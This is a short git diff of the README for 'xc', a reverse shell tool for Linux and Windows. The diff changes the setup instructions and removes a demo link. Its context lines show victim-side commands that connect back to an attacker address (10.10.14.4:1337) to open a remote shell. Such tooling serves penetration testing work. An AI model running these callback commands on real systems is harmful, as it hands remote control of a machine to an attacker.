@@ -72,14 +72,15 @@ Netcat like reverse shell for Linux & Windows. This is still experimental so pul
 - WindowsVictim :   `xc.exe 10.10.14.4 1337`	(Client)
 - Argumentless:     `xc_10.10.14.4_1337.exe`    (Client)
 
-
-[![asciicast](https://asciinema.org/a/g4jkA6N99GqUqJkDzsboj5ZJ5.svg)](https://asciinema.org/a/g4jkA6N99GqUqJkDzsboj5ZJ5)
-
 ## Setup
+
+``` 
+go get github.com/hashicorp/yamux
+go get github.com/ropnop/go-clr
+``` 
 
 Windows:
 ```
-go get github.com/hashicorp/yamux
 go build
 ```
 
